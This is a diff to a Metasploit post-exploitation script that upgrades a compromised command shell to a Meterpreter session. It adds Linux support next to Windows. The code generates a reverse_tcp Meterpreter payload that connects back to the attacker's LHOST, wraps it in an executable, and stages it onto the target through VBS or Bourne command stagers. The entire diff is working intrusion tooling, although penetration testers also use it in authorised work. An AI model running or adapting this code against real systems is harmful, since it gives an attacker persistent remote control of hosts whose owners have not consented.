@@ -31,7 +31,7 @@ def is_port_used?(port)
 end
 
 #
-# Mimics what MSF alreayd does if the user doesn't manually select a payload and lhost
+# Mimics what MSF already does if the user doesn't manually select a payload and lhost
 #
 lhost = framework.datastore['LHOST']
 unless lhost
@@ -61,8 +61,24 @@ use_handler = nil if (session.exploit_datastore['DisablePayloadHandler'] == true
 #Msf::Ui::Common.process_cli_arguments($framework, ARGV)
 
 
+# Handle platform specific variables and settings
+case session.platform
+when /win/i
+  platform = 'win'
+  payload_name = 'windows/meterpreter/reverse_tcp'
+  lplat = [Msf::Platform::Windows]
+  larch = [ARCH_X86]
+when /linux/i
+  platform = 'linux'
+  payload_name = 'linux/x86/meterpreter/reverse_tcp'
+  lplat = [Msf::Platform::Linux]
+  larch = [ARCH_X86]
+else
+  print_error("Shells on the the target platform, #{session.platform}, cannot be upgraded to Meterpreter at this time.")
+  return nil
+end
+
 # Create the payload instance
-payload_name = 'windows/meterpreter/reverse_tcp'
 payload = framework.payloads.create(payload_name)
 options = "LHOST=#{lhost} LPORT=#{lport}"
 buf = payload.generate_simple('OptionStr' => options)
@@ -99,24 +115,26 @@ begin
   #
   # Make the payload into an exe for the CmdStager
   #
-  lplat = [Msf::Platform::Windows]
-  larch = [ARCH_X86]
+  exe = Msf::Util::EXE.to_executable(framework, larch, lplat, buf)
+
+  #
+  # Generate the stager command array
+  #
   linemax = 1700
   if (session.exploit_datastore['LineMax'])
     linemax = session.exploit_datastore['LineMax'].to_i
   end
   opts = {
     :linemax => linemax,
-    :decoder => File.join(Msf::Config.data_directory, "exploits", "cmdstager", "vbs_b64"),
     #:nodelete => true # keep temp files (for debugging)
   }
-  exe = Msf::Util::EXE.to_executable(framework, larch, lplat, buf)
+  if platform == 'win'
+    opts[:decoder] = File.join(Msf::Config.data_directory, "exploits", "cmdstager", "vbs_b64")
+    cmdstager = Rex::Exploitation::CmdStagerVBS.new(exe)
+  else
+    cmdstager = Rex::Exploitation::CmdStagerBourne.new(exe)
+  end
 
-
-  #
-  # Generate the stager command array
-  #
-  cmdstager = Rex::Exploitation::CmdStagerVBS.new(exe)
   cmds = cmdstager.generate(opts)
   if (cmds.nil? or cmds.length < 1)
     print_error("The command stager could not be generated")
@@ -129,13 +147,16 @@ begin
   total_bytes = 0
   cmds.each { |cmd| total_bytes += cmd.length }
 
-
   #
   # Run the commands one at a time
   #
   sent = 0
   cmds.each { |cmd|
-    ret = session.shell_command_token_win32(cmd)
+    if platform == 'win'
+      ret = session.shell_command_token_win32(cmd)
+    else
+      ret = session.shell_command_token_unix(cmd)
+    end
     if (not ret)
       aborted = true
     else
